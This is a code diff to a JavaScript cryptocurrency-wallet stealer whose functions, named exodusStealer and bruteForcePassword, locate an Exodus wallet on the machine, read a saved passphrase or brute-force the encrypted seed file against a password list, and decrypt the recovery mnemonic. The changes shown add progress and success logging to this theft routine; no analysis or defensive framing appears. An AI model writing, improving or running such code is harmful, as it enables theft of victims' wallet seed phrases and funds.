@@ -37,13 +37,20 @@ function bruteForcePassword(seedPath, passwordList) {
     const seedBuffer = fs.readFileSync(seedPath);
     const uniquePasswords = [...new Set(passwordList.filter(p => p.length > 4))];
 
+    const total = uniquePasswords.length;
     const start = process.hrtime();
     let tried = 0;
 
     for (const password of uniquePasswords) {
+        tried++;
+        if (tried % 100 === 0 || tried === 1) {
+            console.log(`[Progress] Trying password ${tried}/${total} : "${password}"`);
+        }
+
         try {
             seco.decryptData(seedBuffer, password);
             const [sec, nano] = process.hrtime(start);
+            console.log(`[Success] Found password after ${tried} attempts!`);
             return {
                 success: true,
                 password,
@@ -51,10 +58,11 @@ function bruteForcePassword(seedPath, passwordList) {
                 time: `${sec} seconds and ${nano / 1e6} milliseconds`
             };
         } catch {
-            tried++;
+            // Incorrect password — keep trying
         }
     }
 
+    console.log(`[Failure] Tried all ${total} passwords. None worked.`);
     return { success: false, tried, error: "Password not found in list." };
 }
 
@@ -62,14 +70,20 @@ function exodusStealer(passwords) {
     const exodusInfo = locateExodus();
 
     if (!exodusInfo.found) {
+        console.log("[Info] Exodus wallet not found.");
         return { found: false };
     }
 
+    console.log(`[Info] Exodus wallet found. Password required: ${exodusInfo.passwordRequired}`);
+
     if (!exodusInfo.passwordRequired) {
+        console.log(`[Info] Using saved passphrase.`);
         const passphrase = JSON.parse(fs.readFileSync(exodusInfo.passphrasePath, "utf8")).passphrase;
         const mnemonic = decrypt(exodusInfo.seedPath, passphrase);
         return { found: true, mnemonic };
     }
+
+    console.log(`[Info] Starting brute force...`);
 
     const brute = bruteForcePassword(exodusInfo.seedPath, passwords);
 
